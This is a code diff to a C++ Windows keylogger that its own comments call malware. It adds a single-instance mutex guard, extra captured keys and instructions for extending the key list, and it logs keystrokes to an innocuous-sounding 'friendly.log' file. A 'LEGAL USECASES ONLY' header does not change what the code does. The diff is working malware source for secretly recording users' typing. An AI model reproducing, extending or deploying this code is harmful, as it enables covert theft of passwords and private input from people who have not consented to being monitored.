@@ -1,3 +1,7 @@
+/*
+ * <c> Sharkbyteprojects
+ * LEGAL USECASES ONLY
+ */
 #include <windows.h>
 #include <future>
 #include <vector>
@@ -6,6 +10,9 @@
 #include <fstream>
 #include <memory>
 #include <ctime>
+
+//GUID THAT MALWARE RUNS ONLY ONE INSTANCE
+#define appguid "{1b885a21-ddce-4300-b2ba-d586680f6942}"
 
 struct elem {
 	char e;
@@ -47,12 +54,15 @@ public:
 	hephistusMD(std::ofstream* d) :i(d) {}
 };
 
+bool shouldClose();
 void malwareDeamon() {
+	if (shouldClose())
+		return;
 	std::ofstream ofile("friendly.log", std::ios_base::app | std::ios_base::out);
 	hephistusMD m(&ofile);
 
-	m.hephistus(0x30, 0x39);
-	m.hephistus(0x41, 0x5a);
+	m.hephistus(0x30, 0x39);//0-9
+	m.hephistus(0x41, 0x5a);//A-Z
 	m.add(VK_TAB, "TAB");
 	m.add(VK_BACK, "Backspace");
 	m.add(VK_RETURN, "Newline");
@@ -60,9 +70,16 @@ void malwareDeamon() {
 	m.add(VK_CONTROL, "CTRL");
 	m.add(VK_MENU, "Alt");
 	m.add(VK_HOME, "WinKey");
+	m.add(VK_SNAPSHOT, "Snapshot");
+	m.add(VK_DELETE, "Delete");
+	m.add(VK_SEPARATOR, "Seperator");
+	m.add(VK_SUBTRACT, "-");
+	m.add(VK_DECIMAL, "Decimal");
+	//ADD ADDITIONAL KEYS HERE WITH m.add(keycode, "Description") or a ASCII range with m.hephistus(start, end);
+	//KEYCODES: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 
 	while (1) {
-		m.run();
+		m.run();//RUN KEYLOG CHECKER
 		//EXIT KEYLOGGER:
 		if (m.gks(VK_F8) && m.gks(VK_CONTROL)) return;
 		Sleep(1);
@@ -110,4 +127,20 @@ int main(int argc, char* argv[])
 	}
 skiphephistus:
 	return fut.get();
+}
+
+bool shouldClose() {
+	//Make sure at most one instance of the tool is running
+	HANDLE hMutexOneInstance(::CreateMutexA(NULL, TRUE, appguid));
+	bool bAlreadyRunning((::GetLastError() == ERROR_ALREADY_EXISTS));
+	if (hMutexOneInstance == NULL || bAlreadyRunning)
+	{
+		if (hMutexOneInstance)
+		{
+			::ReleaseMutex(hMutexOneInstance);
+			::CloseHandle(hMutexOneInstance);
+		}
+		return true;
+	}
+	return false;
 }
